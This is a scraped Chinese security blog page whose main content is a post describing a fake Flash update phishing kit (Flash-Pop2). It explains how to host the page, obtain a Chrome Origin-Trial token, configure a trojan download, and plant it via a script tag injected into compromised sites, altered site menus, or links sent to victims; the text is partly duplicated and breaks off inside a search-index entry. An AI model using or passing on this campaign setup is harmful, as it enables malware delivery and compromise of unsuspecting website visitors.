<script>

  let fontStart = 12, fontEnd = 30, colorStart = '#666', colorEnd = '#000';
  let tags = document.querySelector('#tags').children;
  let counts = [];
  for(let i = 0; i < tags.length; i++) {
    counts.push(tags[i].rel);
  }
  let lowest = Math.min.apply(null,counts), highest = Math.max.apply(null,counts);;
  let range = highest - lowest;
  if (range === 0) {
    range = 1;
  }
  let fontIncr, colorIncr;
  fontIncr = (fontEnd - fontStart) / range;
  
  let sColorArr = toRGB(colorStart), eColorArr = toRGB(colorEnd);

  for(let i = 0; i < tags.length; i++) {
    let disCount = tags[i].rel - lowest;
    let fontSize = fontStart + disCount * fontIncr;
    let style = 'font-size: ' + fontSize + 'px;';
    let arr = [];
    for(let c = 0; c < sColorArr.length; c++) {
      if (disCount === 0) {
        disCount = 1;
      }
      let val = (sColorArr[c] - eColorArr[c]) / range * disCount;
      if (val >= 100) {
        val = eColorArr[c];
      } else if (val <= 0) {
        val = sColorArr[c];
      }
      arr[c] = Math.floor(val);
    }
    style += 'color: ' + toHex(arr);
    tags[i].style = style;
  }

  function toRGB(code) {
    if (code.length === 4) {
      code = code.replace(/(\w)(\w)(\w)/gi, "\$1\$1\$2\$2\$3\$3");
    }
    var hex = /(\w{2})(\w{2})(\w{2})/.exec(code);
    return [parseInt(hex[1], 16), parseInt(hex[2], 16), parseInt(hex[3], 16)];
  }

  function toHex(ary) {
    return "#" + ((1 << 24) + (ary[0] << 16) + (ary[1] << 8) + ary[2]).toString(16).slice(1);
  }

</script>

<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
  back2TopText = document.querySelector('#back_to_top_text'),
  drawerBox = document.querySelector('#drawer_box'),
  rightSideBar = document.querySelector('.sidebar'),
  viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {
   
    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function(e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });
  
  window.addEventListener('scroll', function(e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  
  let hasCacu = false;
  window.onresize = function() {
    if (window.width > 991) {
      calcuHeight();
    } else {
      hasCacu = false;
    }
  }

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();
  
  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function() {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, transitionDir,{ });
          }
        })
        window.Velocity(viewport, openProp,{
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp ,{
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

<script>
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        console.log('复制操作频率过高');
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })
</script>

&lt;li&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161026.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;填写信息并注册&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161055.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;注册成功后会返回一些信息&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161114.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;一个token值，该值在2021年12月31日前有效，之后就需要重新申请&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;宝塔网站配置Origin-Trial响应头&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在网站-&amp;gt;设置-&amp;gt;配置文件中添加&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;add_header Origin-Trial &amp;lt;上步中的token值&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加成功后，响应应该如下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161147.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;设置flash参数&#34;&gt;设置flash参数&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载flash-pop2项目后，进入js文件夹下修改flash.js文件中的参数&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161202.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ttarget： 宝塔网站设置的域名&lt;/li&gt;
&lt;li&gt;target_file: flash马的下载地址&lt;/li&gt;
&lt;li&gt;bc_link: 要跳转到的指定页面&lt;/li&gt;
&lt;li&gt;pb_word: 如上图&lt;/li&gt;
&lt;li&gt;l_url: flash马在本地监听的http服务&lt;/li&gt;
&lt;li&gt;l_res: flash马在本地监听的http服务返回的响应&lt;/li&gt;
&lt;li&gt;a_type: 应用场景&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;flash马&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flash马中应该起一个http服务，并返回设置的l_res内容&lt;/li&gt;
&lt;li&gt;flash马中的http服务应该返回一个用于解决跨域问题的响应头 Access-Control-Allow-Origin: *&lt;/li&gt;
&lt;li&gt;示例如下：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161249.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161309.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;应用&#34;&gt;应用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;已有webshell，可以修改网站源代码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改网站源码，添加&lt;code&gt;&amp;lt;script src=//flash-pop2-domain.com/js/flash.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;没有webshell，可以修改网站菜单&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加或修改菜单链接为https://flash-pop2-domain.com/index.html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;直接发送给客服或者受害者&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将https://flash-pop2-domain.com/index.html直接发送给对方&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://www.jianshu.com/p/4a29309b3ba2&#34;&gt;XHR&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://harttle.land/2015/10/01/javascript-dom-api.html&#34;&gt;原生js dom操作汇总&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://zhuanlan.zhihu.com/p/343487727&#34;&gt;山寨“特供版”flash&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#CDN&#34;&gt;检测与隐藏CS服务器&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://blog.csdn.net/jsbba/article/details/121011835&#34;&gt;CF源IP问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://kebingzao.com/2021/10/11/chrome-private-cors-error/&#34;&gt;http 远程站点请求 ip 地址报 CORS 错误&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://kebingzao.com/2020/04/26/cloudfront-add-x-frame-options/&#34;&gt;CDN添加自定义响应头&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://blog.dsrkafuu.su/post/2020/cloudflare-worker-cors-anywhere/&#34;&gt;cf使用worker添加响应头&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://stackoverflow.com/questions/25395119/catch-asynchronous-network-error-from-xmlhttprequest-send&#34;&gt;一个大坑-请求报错会导致window.onload无法执行&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&#34;https://zh.javascript.info/onload-onerror&#34;&gt;资源加载：onload，onerror&lt;/a&gt;&lt;/p&gt;
">flash钓鱼升级版</a>
      </div>

">CobaltStrike上线自动维权</a>

<script>
  // var escape = "[{&#34;content&#34;:&#34;&lt;h1 id=\&#34;0x01-目标\&#34;&gt;0x01 目标&lt;/h1&gt;\n&lt;h2 id=\&#34;页面展示\&#34;&gt;页面展示：&lt;/h2&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107163101.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;flash页面目标\&#34;&gt;flash页面目标：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;flash页面能够判断当前系统是否已被安装flash马&lt;/li&gt;\n&lt;li&gt;flash页面能够判断当前系统是否是Windows，若不是则跳转到正常或指定页面&lt;/li&gt;\n&lt;li&gt;flash安装完成后需能跳转到正常或指定页面&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;flash马目标\&#34;&gt;flash马目标&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;flash马能够起一个本地服务&lt;/li&gt;\n&lt;li&gt;flash马能够免杀&lt;/li&gt;\n&lt;li&gt;flash马能够捆绑或释放正常flash安装文件&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;过程\&#34;&gt;过程：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;首先判断系统是否为Windows，若不是则显示正常页面或指定页面；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;若是Windows，则请求本地1341端口，判断当前机器是否已被控制。&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;若已被控制，则显示正常页面或跳转到指定页面&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;若未被控制，则弹窗显示flash升级页面&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;等待用户点击”立即升级“按钮&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;用户点击后，js开始每10秒判断一次是否成功执行了程序；&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;若已执行，则跳转到正常页面或指定页面&lt;/li&gt;\n&lt;li&gt;若未执行，则停留在flash弹窗页面&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;应用场景a_type\&#34;&gt;应用场景（a_type）：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;已有webshell，可以修改源码，&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;在目标网站的页面源码中直接插入js：已安装flash的情况下，不做任何操作；未安装flash，弹出flash页面，定时检测，安装完成后，页面刷新 [0]&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;没有webshell，可以修改目标网站的导航菜单：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;添加自己的flash页面，供受害者点击；&lt;/li&gt;\n&lt;li&gt;如果设置了特定页面，则当安装完成后，则跳转到指定页面；&lt;/li&gt;\n&lt;li&gt;若未设置，则跳转到document.referrer(如果其不包含js中设置的域名)[1]&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;直接发送给对方&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;对方直接在浏览器中输入flash地址：如果安装完成后，则直接跳转到指定页面；[2]&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h1 id=\&#34;0x02-使用\&#34;&gt;0x02 使用&lt;/h1&gt;\n&lt;h2 id=\&#34;一-条件\&#34;&gt;(一) 条件：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;一台vps&lt;/li&gt;\n&lt;li&gt;一个域名&lt;/li&gt;\n&lt;li&gt;谷歌账号&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;二-步骤\&#34;&gt;(二) 步骤：&lt;/h2&gt;\n&lt;h3 id=\&#34;配置网站\&#34;&gt;配置网站&lt;/h3&gt;\n&lt;p&gt;这里推荐宝塔，太方便了&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;安装宝塔&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107160817.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;创建网站&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107160944.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;li&gt;在购买域名的地方，添加dns解析到服务器IP&lt;/li&gt;\n&lt;li&gt;在宝塔网站-&amp;gt;设置-&amp;gt;一键配置ssl&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;下载flash页面并上传到宝塔创建的网站目录下面&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;flash项目地址：https://github.com/chroblert/Flash-Pop2&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;申请Origin-Trial&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;访问https://developer.chrome.com/origintrials/#/trials/active&lt;/li&gt;\n&lt;li&gt;选择并注册Private Network Access from       non-secure contexts&lt;/li&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161026.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;li&gt;填写信息并注册&lt;/li&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161055.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;li&gt;注册成功后会返回一些信息&lt;/li&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161114.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;li&gt;一个token值，该值在2021年12月31日前有效，之后就需要重新申请&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;宝塔网站配置Origin-Trial响应头&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;在网站-&amp;gt;设置-&amp;gt;配置文件中添加&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;add_header Origin-Trial &amp;lt;上步中的token值&amp;gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;添加成功后，响应应该如下&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161147.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=\&#34;设置flash参数\&#34;&gt;设置flash参数&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;下载flash-pop2项目后，进入js文件夹下修改flash.js文件中的参数&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161202.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;配置说明&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;ttarget： 宝塔网站设置的域名&lt;/li&gt;\n&lt;li&gt;target_file: flash马的下载地址&lt;/li&gt;\n&lt;li&gt;bc_link: 要跳转到的指定页面&lt;/li&gt;\n&lt;li&gt;pb_word: 如上图&lt;/li&gt;\n&lt;li&gt;l_url: flash马在本地监听的http服务&lt;/li&gt;\n&lt;li&gt;l_res: flash马在本地监听的http服务返回的响应&lt;/li&gt;\n&lt;li&gt;a_type: 应用场景&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;flash马&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;flash马中应该起一个http服务，并返回设置的l_res内容&lt;/li&gt;\n&lt;li&gt;flash马中的http服务应该返回一个用于解决跨域问题的响应头 Access-Control-Allow-Origin: *&lt;/li&gt;\n&lt;li&gt;示例如下：&lt;/li&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161249.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;li&gt;&lt;img src=\&#34;https://gitee.com/chroblert/pictures/raw/master/img/20211107161309.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=\&#34;应用\&#34;&gt;应用&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;已有webshell，可以修改网站源代码&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;修改网站源码，添加&lt;code&gt;&amp;lt;script src=//flash-pop2-domain.com/js/flash.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;没有webshell，可以修改网站菜单&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;添加或修改菜单链接为https://flash-pop2-domain.com/index.html&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;直接发送给客服或者受害者&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;将https://flash-pop2-domain.com/index.html直接发送给对方&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://www.jianshu.com/p/4a29309b3ba2\&#34;&gt;XHR&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://harttle.land/2015/10/01/javascript-dom-api.html\&#34;&gt;原生js dom操作汇总&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://zhuanlan.zhihu.com/p/343487727\&#34;&gt;山寨“特供版”flash&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#CDN\&#34;&gt;检测与隐藏CS服务器&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://blog.csdn.net/jsbba/article/details/121011835\&#34;&gt;CF源IP问题&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://kebingzao.com/2021/10/11/chrome-private-cors-error/\&#34;&gt;http 远程站点请求 ip 地址报 CORS 错误&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://kebingzao.com/2020/04/26/cloudfront-add-x-frame-options/\&#34;&gt;CDN添加自定义响应头&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://blog.dsrkafuu.su/post/2020/cloudflare-worker-cors-anywhere/\&#34;&gt;cf使用worker添加响应头&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://stackoverflow.com/questions/25395119/catch-asynchronous-network-error-from-xmlhttprequest-send\&#34;&gt;一个大坑-请求报错会导致window.onload无法执行&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;参考资料：&lt;a href=\&#34;https://zh.javascript.info/onload-onerror\&#34;&gt;资源加载：onload，onerror&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;flash-diao-yu-sheng-ji-ban&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;flash钓鱼升级版&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2021-11-07 15:22:43&#34;,&#34;dateFormat&#34;:&#34;2021-11-07&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://chroblert.github.io/post/flash-diao-yu-sheng-ji-ban/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:229000,&#34;words&#34;:1026,&#34;minutes&#34;:4},&#34;description&#34;:&#34;0x01 目标\n页面展示：\n\nflash页面目标：\n\nflash页面能够判断当前系统是否已被安装flash马\nflash页面能够判断当前系统是否是Windows，若不是则跳转到正常或指定页面\nflash安装完成后需能跳转到正常或指定页面\n\n...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x01-%E7%9B%AE%E6%A0%87\&#34;&gt;0x01 目标&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA\&#34;&gt;页面展示：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#flash%E9%A1%B5%E9%9D%A2%E7%9B%AE%E6%A0%87\&#34;&gt;flash页面目标：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#flash%E9%A9%AC%E7%9B%AE%E6%A0%87\&#34;&gt;flash马目标&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BF%87%E7%A8%8B\&#34;&gt;过程：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AFa_type\&#34;&gt;应用场景（a_type）：&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x02-%E4%BD%BF%E7%94%A8\&#34;&gt;0x02 使用&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%80-%E6%9D%A1%E4%BB%B6\&#34;&gt;(一) 条件：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BA%8C-%E6%AD%A5%E9%AA%A4\&#34;&gt;(二) 步骤：&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%85%8D%E7%BD%AE%E7%BD%91%E7%AB%99\&#34;&gt;配置网站&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AE%BE%E7%BD%AEflash%E5%8F%82%E6%95%B0\&#34;&gt;设置flash参数&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%BA%94%E7%94%A8\&#34;&gt;应用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;blockquote&gt;\n&lt;p&gt;flash钓鱼后，高兴的是它上线了，可惜的是上线的时候没看到它又掉了....&lt;br&gt;\n&lt;img src=\&#34;https://chroblert.github.io/post-images/1635601129786.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n&#34;,&#34;fileName&#34;:&#34;cobaltstrike-shang-xian-zi-dong-wei-quan&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;CobaltStrike上线自动维权&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2021-10-30 